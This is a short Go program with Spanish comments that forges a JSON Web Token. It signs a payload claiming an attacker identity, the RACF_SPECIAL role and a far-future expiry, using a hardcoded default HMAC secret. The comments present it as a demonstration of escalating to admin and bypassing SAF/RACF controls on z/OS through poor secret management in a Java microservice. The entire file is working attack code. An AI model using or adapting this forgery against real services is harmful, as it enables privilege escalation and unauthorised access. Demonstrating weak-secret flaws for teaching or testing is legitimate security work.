// Explicación: Script en Go que genera un JWT manipulado aprovechando vulnerabilidades de firma simétrica débil.
// Objetivo: Demostrar cómo una mala gestión de secretos en la configuración de un microservicio Java permite escalar privilegios a 'admin' eludiendo los controles de SAF/RACF.
package main

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
)

func main() {
	secret := []byte("zOS_default_secret_123")
	
	header := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"HS256","typ":"JWT"}`))
	payload := base64.RawURLEncoding.EncodeToString([]byte(`{"sub":"attacker_job","role":"RACF_SPECIAL","exp":9999999999}`))

	unsignedToken := header + "." + payload

	mac := hmac.New(sha256.New, secret)
	mac.Write([]byte(unsignedToken))
	signature := base64.RawURLEncoding.EncodeToString(mac.Sum(nil))

	jwt := unsignedToken + "." + signature
	fmt.Printf("Token JWT Forjado con exito:\n%s\n", jwt)
}